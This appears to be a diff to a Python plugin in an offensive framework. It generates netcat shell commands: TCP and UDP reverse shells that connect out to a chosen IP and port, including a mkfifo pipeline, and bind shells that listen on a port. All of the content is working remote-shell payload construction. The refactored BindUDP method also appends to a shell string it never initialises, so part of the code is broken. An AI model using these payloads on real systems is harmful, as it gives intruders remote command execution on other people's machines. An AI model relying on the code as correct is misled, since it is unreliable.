@@ -33,21 +33,11 @@ class ReverseTCP(plugin.ReverseShell):
 
     def make_shell(self):
         self.shell = f"{self.args.type} "
-        if self.is_udp:
-            if self.args.type == "ncat":
-                # TODO reverse UDP for ncat
-                print("[!] Framework doesn't support Reverse UDP for ncat")
-            else:
-                self.shell = f"mkfifo fifo; {self.args.type} -u {self.args.ip} {self.args.port} "
-                self.shell += "< fifo | {"
-                self.shell += f"{self.args.shell} -i; "
-                self.shell += "} > fifo"
+        if self.args.type == "ncat":
+            self.shell += "-e "
         else:
-            if self.args.type == "ncat":
-                self.shell += "-e "
-            else:
-                self.shell += "-c "
-            self.shell += f"{self.args.shell} {self.args.ip} {self.args.port}"
+            self.shell += "-c "
+        self.shell += f"{self.args.shell} {self.args.ip} {self.args.port}"
 
 
 class ReverseUDP(ReverseTCP):
@@ -55,6 +45,16 @@ class ReverseUDP(ReverseTCP):
         super().__init__()
         self.is_udp = True
         self.opts.description = "[ReverseShell][UDP] Netcat from swisskyrepo/PayloadsAllTheThings. License MIT."
+
+    def make_shell(self):
+        if self.args.type == "ncat":
+            # TODO reverse UDP for ncat
+            print("[!] Framework doesn't support Reverse UDP for ncat")
+        else:
+            self.shell = f"mkfifo fifo; {self.args.type} -u {self.args.ip} {self.args.port} "
+            self.shell += "< fifo | {"
+            self.shell += f"{self.args.shell} -i; "
+            self.shell += "} > fifo"
 
 
 class BindTCP(plugin.BindShell):
@@ -80,18 +80,11 @@ class BindTCP(plugin.BindShell):
 
     def make_shell(self):
         self.shell = f"{self.args.type} "
-        if self.is_udp:
-            if self.args.type == "ncat":
-                self.shell += f"-e {self.args.shell} -lup {self.args.port}"
-            else:
-                # TODO Bind UDP for nc
-                print("[!] Framework doesn't support Bind UDP for nc")
+        if self.args.type == "ncat":
+            self.shell += "-e "
         else:
-            if self.args.type == "ncat":
-                self.shell += "-e "
-            else:
-                self.shell += "-c "
-            self.shell += f"{self.args.shell} -lp {self.args.port}"
+            self.shell += "-c "
+        self.shell += f"{self.args.shell} -lp {self.args.port}"
 
 
 class BindUDP(BindTCP):
@@ -99,3 +92,10 @@ class BindUDP(BindTCP):
         super().__init__()
         self.opts.description = "[BindShell][UDP] Netcat from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.is_udp = True
+
+    def make_shell(self):
+        if self.args.type == "ncat":
+            self.shell += f"-e {self.args.shell} -lup {self.args.port}"
+        else:
+            # TODO Bind UDP for nc
+            print("[!] Framework doesn't support Bind UDP for nc")
